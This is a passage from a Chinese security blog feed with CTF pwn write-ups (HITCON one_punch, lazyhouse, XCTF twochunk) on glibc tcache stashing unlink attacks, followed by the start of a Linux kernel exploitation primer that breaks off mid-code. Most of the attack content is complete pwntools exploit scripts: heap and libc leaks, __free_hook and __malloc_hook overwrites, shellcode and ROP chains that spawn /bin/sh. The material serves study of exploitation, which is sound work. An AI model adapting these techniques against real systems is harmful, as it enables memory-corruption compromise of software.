&#39;)    p.sendline(str(idx))    p.recvuntil(&#39;hero name: &#39;)    p.send(name)    sleep(0.1)def show(idx):    cmd(3)    p.recvuntil(&#39;idx: &#39;)    p.sendline(str(idx))def free(idx):    cmd(4)    p.recvuntil(&#39;idx: &#39;)    p.sendline(str(idx))def leave():    cmd(5)def punch(data):    cmd(0xC388)    p.send(data)    sleep(0.1)for i in range(5):    new(0, str(i) * 0xf8)    free(0) # fillup tcache 0x100new(0, &#39;0&#39; * 0x408)new(1, &#39;1&#39; * 0x408)free(0)free(1)show(1) # leak heapp.recvuntil(&#39;hero name: &#39;)heap_base = u64(p.recvuntil(&#39;\n&#39;, drop=True).ljust(8, b&#39;\x00&#39;)) - 0x7a0info(&#39;heap_base = &#39; + hex(heap_base))#gdb.attach(p)for i in range(5):    new(0, str(i) * 0x408)    free(0) # fillup tcache 0x410new(0, &#39;0&#39; * 0x408)sh = asm(&#39;&#39;&#39;    xor rax, rax    mov al, 59    xor rsi, rsi    xor rdx, rdx    mov rdi, 0x68732f2f6e69622f    push rdi    mov rdi, rsp    syscall&#39;&#39;&#39;)info(&#39;sh =&gt; &#39; + repr(sh))new(1, sh.ljust(0x408, b&#39;\x90&#39;))shellcode_addr = heap_base + 0x2820info(&#39;shellcode_addr = &#39; + hex(shellcode_addr))free(0)show(0) # leak libcp.recvuntil(&#39;hero name: &#39;)libc_base = u64(p.recvuntil(&#39;\n&#39;, drop=True).ljust(8, b&#39;\x00&#39;)) - 0x1ebbe0info(&#39;libc_base = &#39; + hex(libc_base))#gdb.attach(p)for i in range(3):    new(1, &#39;1&#39; * 0x408)    new(2, &#39;2&#39; * 0x408) # prevent from consolidate    free(1) # put into unsorted bin    new(2, &#39;2&#39; * 0x308) # stash remainder(0x100) into small binsnew(0, &#39;0&#39; * 0x217) # set up tcache 0x217 before unlinkfree(0) # put into tcache 0x220payload = b&#39;\x00&#39; * 0x308 + p64(0x101) + p64(heap_base + 0x3340) + p64(heap_base + 0x40)#payload = p64(0xdeadbeef)edit(1, payload) # overwrite smallbins&#39; bknew(1, &#39;1&#39; * 0xf8) # unlink#gdb.attach(p)free_hook_addr = libc_base + libc.symbols[&#39;__free_hook&#39;]system_addr = libc_base + libc.symbols[&#39;system&#39;]edit(0, p64(free_hook_addr).ljust(0x217, b&#39;\x00&#39;)) # change tcache 0x220&#39;s fd =&gt; __free_hookpunch(&#39;punch&#39;) # get a chunk from tcache 0x220punch(p64(system_addr)) # get __free_hook from tcache 0x220new(2, b&#39;/bin/sh\x00&#39;.ljust(0x408, b&#39;\x00&#39;))free(2)p.interactive()</code></pre><h2 id="2019-HITCON-lazyhouse（tcache-stashing-unlink-attack-plus）"><a href="#2019-HITCON-lazyhouse（tcache-stashing-unlink-attack-plus）" class="headerlink" title="2019-HITCON-lazyhouse（tcache stashing unlink attack plus）"></a>2019-HITCON-lazyhouse（tcache stashing unlink attack plus）</h2><blockquote><p>环境：Ubuntu 19.04（Docker）<br>源程序也有 seccomp filter，这里 patch 了<br>使用 IDA 反编译时不能正常显示 switch 语句，具体修改参考<a href="https://www.bilibili.com/read/cv5150631/" target="_blank" rel="noopener">这篇文章</a>。</p></blockquote><p>这道题目非常精彩，结合了很多技术，<a href="http://blog.keenan.top/2019/11/04/Hitcon-CTF-2019-LazyHouse-Part-2/" target="_blank" rel="noopener">keenan 的博客</a>里解释的很详细。因为其中会涉及在 tcache_pthread_struct 上伪造 Chunk，而 glibc-2.31 中的 count 字段从 1 个字节变为了 2 个字节，所以在 20.04 上暂时没想到利用方法，这里就在 19.04 上复现了一遍。buy 的时候可以看到同样不能用 fastbins，而且会比较钱的大小（money 初始化为 0x1c796），这里存在一个乘法溢出。且使用 calloc：</p><pre><code class="cpp">    if ( size &gt; 0x7F )    {      if ( 0xDA * size &lt;= money )      {        memset(&amp;s, 0, 0x100uLL);        snprintf(&amp;s, 0x100uLL, &quot;Price:%lu&quot;, money);        writeline_buf(&amp;s);        qword_5060[3 * v1 + 2] = size &lt;&lt; 6;        qword_5060[3 * v1 + 1] = size;        money -= 0xDA * size;        buf = calloc(1uLL, size);        if ( buf )        {          write_buf(&quot;House:&quot;);          read_buf((__int64)buf, size);          qword_5060[3 * v1] = buf;        }</code></pre><p>upgrade 中可以多写 0x20 个字节，可以 overflow 到下一个 Chunk 的 bk，buy_super 是隐藏函数，调用 malloc：</p><pre><code class="cpp">void *upgrade(){  __int64 v0; // ST08_8  void *result; // rax  unsigned __int64 v2; // [rsp+0h] [rbp-10h]  if ( unk_5018 &lt;= 0 )    return (void *)writeline_buf(&quot;You cannot upgrade again !&quot;);  write_buf(&quot;Index:&quot;);  v2 = read_long();  if ( v2 &gt; 7 || !qword_5060[3 * v2] )    return (void *)writeline_buf(&quot;Invalid !&quot;);  v0 = qword_5060[3 * v2 + 1];  write_buf(&quot;House:&quot;);  read_buf(qword_5060[3 * v2], v0 + 0x20);  qword_5060[3 * v2 + 2] = 218 * v0;  result = &amp;unk_5018;  --unk_5018;  return result;}unsigned __int64 buy_super(){  char s; // [rsp+0h] [rbp-310h]  unsigned __int64 v2; // [rsp+308h] [rbp-8h]  v2 = __readfsqword(0x28u);  if ( qword_5040[0] )  {    writeline_buf(&quot;Lays already has a super house!&quot;);  }  else  {    if ( money &lt;= 0x216FFFFFuLL )    {      writeline_buf(&quot;You don&#39;t have enough money to buy the luxury house&quot;);      _exit(535);    }    money -= 0x21700000LL;    memset(&amp;s, 0, 0x300uLL);    write_buf(&quot;House:&quot;);    read_buf((__int64)&amp;s, 0x217u);    qword_5040[0] = malloc(0x217uLL);    memset((void *)qword_5040[0], 0, 0x217uLL);    strncpy((char *)qword_5040[0], &amp;s, 0x217uLL);    qword_5040[2] = (const void *)0x21700000;    qword_5040[1] = &amp;off_210 + 7;    writeline_buf(&quot;Done!&quot;);  }  return __readfsqword(0x28u) ^ v2;}</code></pre><p>一开始通过乘法溢出来改 money 的大小，然后利用 largebins 同时泄漏 heap 和 libc。然后通过 unlink 构造 overlapping，最后构造好 smallbins 的 bk，依次取构造好的 Chunk。Exploit：</p><pre><code class="python">#!/usr/bin/env pythonfrom pwn import *context.arch = &#39;amd64&#39;#context.log_level = &#39;debug&#39;context.terminal = [&#39;tmux&#39;, &#39;split&#39;, &#39;-h&#39;]p = process(&#39;./lazyhouse&#39;)libc = ELF(&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;)def cmd(c):    p.recvuntil(&#39;choice: &#39;)    p.sendline(str(c))def new(idx, sz, content):    cmd(1)    p.recvuntil(&#39;Your money:&#39;)    money = int(p.recvuntil(&#39;\n&#39;, drop=True))    info(&#39;money = &#39; + hex(money))    p.recvuntil(&#39;Index:&#39;)    p.sendline(str(idx))    p.recvuntil(&#39;Size:&#39;)    p.sendline(str(sz))    if sz &lt; pow(2, 32):        p.recvuntil(&#39;House:&#39;)        p.send(content)        sleep(0.1)def show(idx):    cmd(2)    p.recvuntil(&#39;Index:&#39;)    p.sendline(str(idx))def free(idx):    cmd(3)    p.recvuntil(&#39;Index:&#39;)    p.sendline(str(idx))def edit(idx, content):    cmd(4)    p.recvuntil(&#39;Index:&#39;)    p.sendline(str(idx))    p.recvuntil(&#39;House:&#39;)    p.send(content)    sleep(0.1)def secret(content):    cmd(5)    p.recvuntil(&#39;House:&#39;)    p.send(content)    sleep(0.1)size = int((pow(2, 64) - 1) // 0xDA) + 1info(&#39;size = &#39; + hex(size))new(0, size, &#39;0&#39;) # bypassfree(0)new(0, 0x88, &#39;0&#39;)new(1, 0x508, &#39;1&#39;) # put into largebins later for leaknew(2, 0x88, &#39;2&#39;)free(1)new(1, 0x608, &#39;1&#39;) # trigger consolidate ; put 0x508 into largebinsedit(0, &#39;\x00&#39; * 0x88 + p64(0x513)) # set IS_MMAPEDnew(7, 0x508, &#39;7&#39;)show(7)leak_data = p.recvn(0x500)libc_base = u64(leak_data[0x8:0x10]) - 0x1e50d0info(&#39;libc_base = &#39; + hex(libc_base))heap_base = u64(leak_data[0x10:0x18]) - 0x2e0info(&#39;heap_base = &#39; + hex(heap_base))#gdb.attach(p)free(0)free(1)free(2)size = 0x90 * 4 - 0x10target = heap_base + 0x890payload = p64(0) + p64(size | 1) + p64(target + 0x20 - 0x18) + p64(target + 0x20 - 0x10) + p64(target)new(6, 0x88, payload) # create fake chunk for unlinknew(5, 0x88, &#39;5&#39;)new(0, 0x88, &#39;0&#39;)new(1, 0x88, &#39;1&#39;)new(2, 0x608, &#39;\x00&#39; * 0x508 + p64(0x101))edit(1, &#39;\x00&#39; * 0x80 + p64(size) + p64(0x610)) # overwrite prev_size &amp; size (PREV_INUSE)free(2) # unlinkpayload = (    &#39;\x00&#39; * 0x78 + p64(0x6c1) + # 5    &#39;\x00&#39; * 0x88 + p64(0x31) + # 0    &#39;\x00&#39; * 0x88 + p64(0x21) # 1)new(2, 0x508, payload) # merge into top chunkfree(0)free(1)free(2)#gdb.attach(p)new(0, 0x1a8, &#39;\x00&#39; * 0x78 + p64(0x6c1))new(1, 0x218, &#39;1&#39;)new(2, 0x218, &#39;2&#39;)free(2)new(2, 0x218, &#39;\x00&#39; * 0x148 + p64(0xd1)) # create fake chunk ; bypass checkfree(2)for i in range(5):    new(2, 0x218, &#39;2&#39;)    free(2) # fillup tcache 0x220new(2, 0x3a8, &#39;2&#39;)free(2) # create fake size in tcache_pthread_struct#raw_input(&#39;@&#39;)free(1)new(1, 0x228, &#39;1&#39;) # trigger consolidate ; put into smallbins 0x100free(5)#raw_input(&#39;@&#39;)smallbins_addr = libc_base + 0x1e4eb0tcache_fake_chunk_addr = heap_base + 0x40payload = &#39;\x00&#39; * 0x98 + p64(0x31) + p64(tcache_fake_chunk_addr) + &#39;\x00&#39; * 0x80 + p64(0x221) + p64(smallbins_addr) + p64(tcache_fake_chunk_addr)new(5, 0x6b1, payload)#raw_input(&#39;@&#39;)pop_rdi_ret = libc_base + next(libc.search(asm(&#39;pop rdi ; ret&#39;)))pop_rsi_ret = libc_base + next(libc.search(asm(&#39;pop rsi ; ret&#39;)))pop_rdx_ret = libc_base + next(libc.search(asm(&#39;pop rdx ; ret&#39;)))pop_rax_ret = libc_base + next(libc.search(asm(&#39;pop rax ; ret&#39;)))leave_ret = libc_base + next(libc.search(asm(&#39;leave ; ret&#39;)))syscall_ret = libc_base + next(libc.search(asm(&#39;syscall ; ret&#39;)))#bin_sh_addr = libc_base + next(libc.search(&#39;/bin/sh&#39;))bin_sh_addr = heap_base + 0xa50malloc_hook_addr = libc_base + libc.symbols[&#39;__malloc_hook&#39;]system_addr = libc_base + libc.symbols[&#39;system&#39;]rop_offset = heap_base + 0xa70 - 0x8payload = &#39;/bin/sh&#39;.ljust(0x20, &#39;\x00&#39;) + p64(pop_rdi_ret) + p64(bin_sh_addr) + p64(system_addr)new(3, 0x218, payload) # set rop chain#raw_input(&#39;@&#39;)new(2, 0x218, p64(0) * 0x20 + p64(malloc_hook_addr)) # overwrite tcache 0x220&#39;s entrysecret(p64(leave_ret))info(&#39;leave_ret = &#39; + hex(leave_ret))#raw_input(&#39;@&#39;)new(4, rop_offset, &#39;4&#39;)p.interactive()</code></pre><h2 id="2020-XCTF-GXZY-twochunk（tcache-stashing-unlink-attack-plus-plus）"><a href="#2020-XCTF-GXZY-twochunk（tcache-stashing-unlink-attack-plus-plus）" class="headerlink" title="2020-XCTF-GXZY-twochunk（tcache stashing unlink attack plus plus）"></a>2020-XCTF-GXZY-twochunk（tcache stashing unlink attack plus plus）</h2><blockquote><p>环境：Ubuntu 20.04（VMware Fusion）</p></blockquote><p>这道题目在 IDA 中也需要修复一下 switch 语句。和前面一样，add 中调用 calloc，而且不能用 fastbins。这里有三个隐藏函数，分别可以用来泄漏 libc、写 system 以及调用。作者的意图比较明显，基本上就是 tcache stashing unlink attack plus plus 了：</p><pre><code class="cpp">__int64 info(){  if ( !dword_4018 )    failed();  printf(&quot;name: %s&quot;, buf);  printf(&quot;message: %s\n&quot;, buf + 48);  return (unsigned int)(dword_4018-- - 1);}__int64 write_buf(){  void *buf; // ST08_8  if ( !dword_401C )    failed();  printf(&quot;leave your end message: &quot;);  buf = malloc(0x88uLL);  read(0, buf, 0x80uLL);  return (unsigned int)(dword_401C-- - 1);}__int64 execute(){  return (*(__int64 (__fastcall **)(_QWORD, _QWORD, _QWORD))buf)(           *((_QWORD *)buf + 6),           *((_QWORD *)buf + 7),           *((_QWORD *)buf + 8));}</code></pre><p>漏洞同样是 edit 的时候可以多读 0x20 个字节，可以 overflow 到下一个 Chunk 的 bk：</p><pre><code class="cpp">__int64 edit(){  int idx; // [rsp+Ch] [rbp-4h]  puts(&quot;just edit once!&quot;);  if ( !edit_flag )    failed();  printf(&quot;idx: &quot;);  idx = read_int_();  if ( !*((_QWORD *)&amp;unk_40A0 + 2 * idx) )    failed();  printf(&quot;content: &quot;);  read(0, *((void **)&amp;unk_40A0 + 2 * idx), *((_DWORD *)&amp;unk_40A8 + 4 * idx) + 0x20);  return (unsigned int)(edit_flag-- - 1);}</code></pre><p>Exploit：</p><pre><code class="python">#!/usr/bin/env python3from pwn import *#context.log_level = &#39;debug&#39;context.terminal = [&#39;tmux&#39;, &#39;split&#39;, &#39;-h&#39;]p = process(&#39;./twochunk&#39;)libc = ELF(&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;)def intro(name, msg):    p.recvuntil(&#39;name: &#39;)    p.send(name)    sleep(0.1)    p.recvuntil(&#39;your message: &#39;)    p.send(msg)    sleep(0.1)def cmd(c):    p.recvuntil(&#39;choice: &#39;)    p.sendline(str(c))def add(idx, sz):    cmd(1)    p.recvuntil(&#39;idx: &#39;)    p.sendline(str(idx))    p.recvuntil(&#39;size: &#39;)    p.sendline(str(sz))def free(idx):    cmd(2)    p.recvuntil(&#39;idx: &#39;)    p.sendline(str(idx))def show(idx):    cmd(3)    p.recvuntil(&#39;idx: &#39;)    p.sendline(str(idx))def edit(idx, content):    cmd(4)    p.recvuntil(&#39;idx: &#39;)    p.sendline(str(idx))    p.recvuntil(&#39;content: &#39;)    p.send(content)    sleep(0.1)buf = 0x23333000 + 0x30intro(p64(buf - 0x10) * 6, p64(0xdeadbeef))for i in range(5):    add(0, 0x88)    free(0) # fillup tcache 0x90# leak heapadd(0, 0xE9)free(0) # put into tcache 0x100add(0, 0xE9)free(0) # put into tcache 0x100add(0, 0x5B25) # get a chunk from tcache 0x100show(0)heap_base = u64(p.recv(8)) - 0x570info(&#39;heap_base = &#39; + hex(heap_base))free(0)for i in range(7):    add(0, 0x188)    free(0) # fillup tcache 0x190# create smallbinsadd(0, 0x188)add(1, 0x308) # paddingfree(0) # put into unsortedbinadd(0, 0xf8) # last_remainder = 0x188 - 0xf8 = 0x90free(0)add(0, 0x108) # trigger consolidate ; put into smallbin 0x90free(0)free(1)# repeatadd(0, 0x188)add(1, 0x308) # paddingfree(0) # put into unsortedbinfree(1)add(0, 0xf8) # last_remainder = 0x188 - 0xf8 = 0x90add(1, 0x108) # trigger consolidate ; put into smallbin 0x90#gdb.attach(p)target = 0x23333000payload = b&#39;\x00&#39; * 0xf0 + p64(0) + p64(0x91) + p64(heap_base + 0x1350) + p64(target - 0x10)#payload = p64(0xdeadbeef)edit(0, payload) # overwrite smallbins&#39; bkfree(1)add(1, 0x88) # trigger smallbin stash unlink# leak libccmd(5)p.recvuntil(&#39;message: &#39;)libc_base = u64(p.recvuntil(&#39;\n&#39;, drop=True).ljust(8, b&#39;\x00&#39;)) - 0x1ebc60info(&#39;libc_base = &#39; + hex(libc_base))system_addr = libc_base + libc.symbols[&#39;system&#39;]bin_sh_addr = libc_base + next(libc.search(b&#39;/bin/sh&#39;))cmd(6)payload = p64(system_addr).ljust(0x30, b&#39;\x00&#39;) + p64(bin_sh_addr) + p64(0) + p64(0)p.send(payload)cmd(7)#gdb.attach(p)p.interactive()</code></pre><h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><p><a href="https://mp.weixin.qq.com/s/9HikpVaV5tpuBtu6hcAt3A" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/9HikpVaV5tpuBtu6hcAt3A</a><br><a href="https://tianstcht.github.io/2020-%E9%AB%98%E6%A0%A1%E6%88%98%E7%96%AB-writeup-PWN/" target="_blank" rel="noopener">https://tianstcht.github.io/2020-%E9%AB%98%E6%A0%A1%E6%88%98%E7%96%AB-writeup-PWN/</a><br><a href="https://medium.com/@ktecv2000/hitcon-ctf-2019-quals-one-punch-man-pwn-292pts-3e94eb3fd312" target="_blank" rel="noopener">https://medium.com/@ktecv2000/hitcon-ctf-2019-quals-one-punch-man-pwn-292pts-3e94eb3fd312</a><br><a href="https://balsn.tw/ctf_writeup/20191012-hitconctfquals/" target="_blank" rel="noopener">https://balsn.tw/ctf_writeup/20191012-hitconctfquals/</a><br><a href="http://blog.keenan.top/2019/11/04/Hitcon-CTF-2019-LazyHouse/" target="_blank" rel="noopener">http://blog.keenan.top/2019/11/04/Hitcon-CTF-2019-LazyHouse/</a><br><a href="http://blog.keenan.top/2019/11/04/Hitcon-CTF-2019-LazyHouse-Part-2/" target="_blank" rel="noopener">http://blog.keenan.top/2019/11/04/Hitcon-CTF-2019-LazyHouse-Part-2/</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;自 glibc-2.29 后 Unsortedbin Attack 已经不再适用，在 Tcache 机制上又出现了一种新的技术。&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="ctf" scheme="blog.b3ale.cn/tags/ctf/"/>
    
      <category term="pwn" scheme="blog.b3ale.cn/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>Basic Kernel Exploitation</title>
    <link href="blog.b3ale.cn/2020/04/26/%5BTODO%5DBasic-Kernel-Exploitation/"/>
    <id>blog.b3ale.cn/2020/04/26/%5BTODO%5DBasic-Kernel-Exploitation/</id>
    <published>2020-04-26T15:26:55.000Z</published>
    <updated>2020-05-17T07:54:10.000Z</updated>
    
    <content type="html"><![CDATA[<p>初涉 Kernel Exploit。</p><a id="more"></a><blockquote><p>基本是跟着 <a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/kernel/basic_knowledge-zh/" target="_blank" rel="noopener">CTF-Wiki</a> 和 <a href="http://m4x.fun/post/linux-kernel-pwn-abc-1/" target="_blank" rel="noopener">M4x 师傅</a>做的内容。</p></blockquote><h1 id="Basic-Knowledge"><a href="#Basic-Knowledge" class="headerlink" title="Basic Knowledge"></a>Basic Knowledge</h1><p>一部分内容在 <a href="https://github.com/qianfei11/UnixNotebook" target="_blank" rel="noopener">Unix 系统分析课的笔记</a>中有所记录。</p><h2 id="What-is-kernel"><a href="#What-is-kernel" class="headerlink" title="What is kernel?"></a>What is kernel?</h2><p>Kernel 是一个程序，用来管理软件发出的数据 I/O 要求，将这些要求转义为指令，交给 CPU 和计算机中的其他组件处理。最主要的功能有两点（包括 I/O，权限控制，系统调用，进程管理，内存管理等多项功能）：</p><ol><li>控制并与硬件进行交互；</li><li>提供 Application 能运行的环境。</li></ol><blockquote><p>应用程序的 crash 直接终止程序，而内核的 crash 会直接引发重启。</p></blockquote><h2 id="Ring-Model"><a href="#Ring-Model" class="headerlink" title="Ring Model"></a>Ring Model</h2><p>Intel CPU 将 CPU 的特权级别分为 4 个级别：Ring 0、Ring 1、Ring 2 和 Ring 3。Ring 0 只给 OS 使用，Ring 3 所有程序都可以使用，内层 Ring 可以随便使用外层 Ring 的资源。而使用 Ring Model 是为了提升系统安全性。</p><blockquote><p>大多数的现代操作系统只使用了 Ring 0 和 Ring 3。</p></blockquote><h2 id="Loadable-Kernel-Modules（LKMs）"><a href="#Loadable-Kernel-Modules（LKMs）" class="headerlink" title="Loadable Kernel Modules（LKMs）"></a>Loadable Kernel Modules（LKMs）</h2><p>可加载核心模块（内核模块）就像运行在内核空间的可执行程序，包括：</p><ul><li>驱动程序（Device Drivers）<ul><li>设备驱动</li><li>文件系统驱动</li><li>…</li></ul></li><li>内核扩展模块 (modules)</li></ul><blockquote><p>LKMs 的文件格式和用户态的可执行程序相同，因此可以使用 IDA 等工具来分析内核模块。</p></blockquote><p>Linux 内核之所以提供模块机制，是因为它本身是一个单内核（Monolithic Kernel）。单内核的优点是效率高，所有的内容都集合在一起，但是可扩展性和可维护性相对较差，模块机制就是为了弥补这一缺陷。</p><h2 id="syscall"><a href="#syscall" class="headerlink" title="syscall"></a>syscall</h2><p>系统调用是用户空间的程序向操作系统内核请求需要更高权限的服务，比如 IO 操作或者进程间通信。系统调用提供用户程序与操作系统间的接口，部分库函数实际上是对系统调用的封装。</p><h3 id="ioctl"><a href="#ioctl" class="headerlink" title="ioctl"></a><code>ioctl</code></h3><p><code>ioctl</code> 是一个系统调用，用于与设备通信：</p><pre><code class="txt">IOCTL(2)                    BSD System Calls Manual                   IOCTL(2)NAME     ioctl -- control deviceSYNOPSIS     #include &lt;sys/ioctl.h&gt;     int     ioctl(int fildes, unsigned long request, ...);DESCRIPTION     The ioctl() function manipulates the underlying device parameters of special files.  In particular, many operat-     ing characteristics of character special files (e.g. terminals) may be controlled with ioctl() requests.  The     argument fildes must be an open file descriptor.     An  ioctl request has encoded in it whether the argument is an ``in&#39;&#39; parameter or ``out&#39;&#39; parameter, and the     size of the argument argp in bytes.  Macros and defines used in specifying an ioctl request are located in the     file &lt;sys/ioctl.h&gt;.</code></pre><ul><li>第一个参数 <code>fildes</code> 为打开设备返回的文件描述符；</li><li>第二个参数 <code>request</code> 为用户程序对设备的控制命令；</li><li>再后边的参数则是一些补充参数，与设备有关。</li></ul><p>内核使用 <code>ioctl</code> 进行通信的原因：</p><ul><li>操作系统提供了内核访问标准外部设备的系统调用，因为大多数硬件设备只能够在内核空间内直接寻址，但访问非标准硬件设备这些系统调用显得不合适，有时候用户模式可能需要直接访问设备；</li><li>为了解决这个问题，内核被设计成可扩展的，可以加入一个称为设备驱动的模块，驱动的代码允许在内核空间运行而且可以对设备直接寻址。一个 <code>ioctl</code> 接口是一个独立的系统调用，通过它用户空间可以跟设备驱动沟通。对设备驱动的请求是一个以设备和请求号码为参数的 <code>ioctl</code> 调用，如此内核就允许用户空间访问设备驱动进而访问设备而不需要了解具体的设备细节，同时也不需要一大堆针对不同设备的系统调用。</li></ul><h2 id="Status-Switching"><a href="#Status-Switching" class="headerlink" title="Status Switching"></a>Status Switching</h2><h3 id="User-Space-to-Kernel-Space"><a href="#User-Space-to-Kernel-Space" class="headerlink" title="User Space to Kernel Space"></a>User Space to Kernel Space</h3><p>当发生<strong>系统调用</strong>、产生<strong>异常、</strong>外设产生<strong>中断</strong>等事件时，会发生用户态到内核态的切换。步骤如下：</p><ol><li>用 <code>SWAPGS</code> 指令切换 GS 段寄存器，将 GS 寄存器值和一个特定位置的值进行交换，目的是保存 GS 值，同时将该位置的值作为内核执行时的 GS 值使用；</li><li>将当前栈顶（用户空间栈顶）记录在 CPU 独占变量区域里，将 CPU 独占区域里记录的内核栈顶放入 RSP/ESP；</li><li>用 PUSH 指令保存各寄存器值；</li><li>判断是否为 <code>x32_abi</code>；</li><li>根据系统调用号跳到全局变量 <code>sys_call_table</code> 相应位置继续执行系统调用。</li></ol><p><a href="https://elixir.bootlin.com/linux/v4.12/source/arch/x86/entry/entry_64.S#L136" target="_blank" rel="noopener">保存用户态各个寄存器的值</a>：</p><pre><code class="nasm">ENTRY(entry_SYSCALL_64)    /*     * Interrupts are off on entry.     * We do not frame this tiny irq-off block with TRACE_IRQS_OFF/ON,     * it is too small to ever cause noticeable irq latency.     */    SWAPGS_UNSAFE_STACK    /*     * A hypervisor implementation might want to use a label     * after the swapgs, so that it can do the swapgs     * for the guest and jump here on syscall.     */GLOBAL(entry_SYSCALL_64_after_swapgs)    movq    %rsp, PER_CPU_VAR(rsp_scratch)    movq    PER_CPU_VAR(cpu_current_top_of_stack), %rsp    TRACE_IRQS_OFF    /* Construct struct pt_regs on stack */    pushq    $__USER_DS            /* pt_regs-&gt;ss */    pushq    PER_CPU_VAR(rsp_scratch)    /* pt_regs-&gt;sp */    pushq    %r11                /* pt_regs-&gt;flags */    pushq    $__USER_CS            /* pt_regs-&gt;cs */    pushq    %rcx                /* pt_regs-&gt;ip */    pushq    %rax                /* pt_regs-&gt;orig_ax */    pushq    %rdi                /* pt_regs-&gt;di */    pushq    %rsi                /* pt_regs-&gt;si */    pushq    %rdx                /* pt_regs-&gt;dx */    pushq    %rcx                /* pt_regs-&gt;cx */    pushq    $-ENOSYS            /* pt_regs-&gt;ax */    pushq    %r8                /* pt_regs-&gt;r8 */    pushq    %r9                /* pt_regs-&gt;r9 */    pushq    %r10                /* pt_regs-&gt;r10 */    pushq    %r11                /* pt_regs-&gt;r11 */    sub    $(6*8), %rsp            /* pt_regs-&gt;bp, bx, r12-15 not saved */</code></pre><h3 id="Kernel-Space-to-User-Space"><a href="#Kernel-Space-to-User-Space" class="headerlink" title="Kernel Space to User Space"></a>Kernel Space to User Space</h3><p>退出内核态的步骤如下：</p><ol><li>通过 <code>SWAPGS</code> 恢复 GS 值；</li><li>通过 <code>sysretq</code> 或者 <code>iretq</code> 恢复到用户上下文继续执行。如果使用 <code>iretq</code> 还需要给出用户空间的一些信息（CS, EFLAGS/RFLAGS, ESP/RSP 等）。</li></ol><h2 id="Process-Structure"><a href="#Process-Structure" class="headerlink" title="Process Structure"></a>Process Structure</h2><p>Kernel 中使用 <a href="https://elixir.bootlin.com/linux/v4.12/source/include/linux/cred.h#L110" target="_blank" rel="noopener"><code>cred</code> 结构体</a>记录进程的权限等信息（uid、gid 等），如果能修改某个进程的 <code>cred</code>，那么也就修改了这个进程的权限。</p><pre><code class="cpp">/* * The security context of a task * * The parts of the context break down into two categories: * *  (1) The objective context of a task.  These parts are used when some other *    task is attempting to affect this one. * *  (2) The subjective context.  These details are used when the task is acting *    upon another object, be that a file, a task, a key or whatever. * * Note that some members of this structure belong to both categories - the * LSM security pointer for instance. * * A task has two security pointers.  task-&gt;real_cred points to the objective * context that defines that task&#39;s actual details.  The objective part of this * context is used whenever that task is acted upon. * * task-&gt;cred points to the subjective context that defines the details of how * that task is going to act upon another object.  This may be overridden * temporarily to point to another security context, but normally points to the * same context as task-&gt;real_cred. */struct cred {    atomic_t    usage;#ifdef CONFIG_DEBUG_CREDENTIALS    atomic_t    subscribers;    /* number of processes subscribed */    void        *put_addr;    unsigned    magic;#define CRED_MAGIC    0x43736564#define CRED_MAGIC_DEAD    0x44656144#endif    kuid_t        uid;        /* real UID of the task */    kgid_t        gid;        /* real GID of the task */    kuid_t        suid;        /* saved UID of the task */    kgid_t        sgid;        /* saved GID of the task */    kuid_t        euid;        /* effective UID of the task */    kgid_t        egid;        /* effective GID of the task */    kuid_t        fsuid;        /* UID for VFS ops */    kgid_t        fsgid;        /* GID for VFS ops */    unsigned    securebits;    /* SUID-less security management */    kernel_cap_t    cap_inheritable; /* caps our children can inherit */    kernel_cap_t    cap_permitted;    /* caps we&#39;re permitted */    kernel_cap_t    cap_effective;    /* caps we can actually use */    kernel_cap_t    cap_bset;    /* capability bounding set */    kernel_cap_t    cap_ambient;    /* Ambient capability set */#ifdef CONFIG_KEYS    unsigned char    jit_keyring;    /* default keyring to attach requested                     * keys to */    struct key __rcu *session_keyring; /* keyring inherited over fork */    struct key    *process_keyring; /* keyring private to this process */    struct key    *thread_keyring; /* keyring private to this thread */    struct key    *request_key_auth; /* assumed request_key authority */#endif#ifdef CONFIG_SECURITY    void        *security;    /* subjective LSM security */#endif    struct user_struct *user;    /* real user ID subscription */    struct user_namespace *user_ns; /* user_ns the caps and keyrings are relative to. */    struct group_info *group_info;    /* supplementary groups for euid/fsgid */    struct rcu_head    rcu;        /* RCU deletion hook */};</code></pre><h2 id="Functions-in-Kernel"><a href="#Functions-in-Kernel" class="headerlink" title="Functions in Kernel"></a>Functions in Kernel</h2><p>内核态中的函数对应用户态函数：</p><ul><li><code>printf()</code> -&gt; <code>printk()</code><ul><li><code>printk()</code> 不一定会把内容显示到终端上，但一定在内核缓冲区里，可以通过 <code>dmesg</code> 查看效果</li></ul></li><li><code>memcpy()</code> -&gt; <code>copy_from_user()</code>/<code>copy_to_user()</code><ul><li><code>copy_from_user()</code>：实现了将用户空间的数据传送到内核空间</li><li><code>copy_to_user()</code>：实现了将内核空间的数据传送到用户空间</li></ul></li><li><code>malloc()</code> -&gt; <code>kmalloc()</code><ul><li>内核态的内存分配函数，和 <code>malloc()</code> 相似，但使用的是 <code>slab/slub</code> 分配器</li></ul></li><li><code>free()</code> -&gt; <code>kfree()</code>，同 <code>kmalloc()</code></li></ul><p>同时 Kernel 中有两个（<a href="https://elixir.bootlin.com/linux/v4.12/source/kernel/cred.c#L423" target="_blank" rel="noopener"><code>int commit_creds(struct cred *new)</code></a> 和 <a href="https://elixir.bootlin.com/linux/v4.12/source/kernel/cred.c#L595" target="_blank" rel="noopener"><code>struct cred *prepare_kernel_cred(struct task_struct *daemon)</code></a>）可以改变权限的函数：</p><pre><code class="cpp">/** * commit_creds - Install new credentials upon the current task * @new: The credentials to be assigned * * Install a new set of credentials to the current task, using RCU to replace * the old set.  Both the objective and the subjective credentials pointers are * updated.  This function may not be called if the subjective credentials are * in an overridden state. * * This function eats the caller&#39;s reference to the new credentials. * * Always returns 0 thus allowing this function to be tail-called at the end * of, say, sys_setgid(). */int commit_creds(struct cred *new){    struct task_struct *task = current;    const struct cred *old = task-&gt;real_cred;    kdebug(&quot;commit_creds(%p{%d,%d})&quot;, new,           atomic_read(&amp;new-&gt;usage),           read_cred_subscribers(new));    BUG_ON(task-&gt;cred != old);#ifdef CONFIG_DEBUG_CREDENTIALS    BUG_ON(read_cred_subscribers(old) &lt; 2);    validate_creds(old);    validate_creds(new);#endif    BUG_ON(atomic_read(&amp;new-&gt;usage) &lt; 1);    get_cred(new); /* we will require a ref 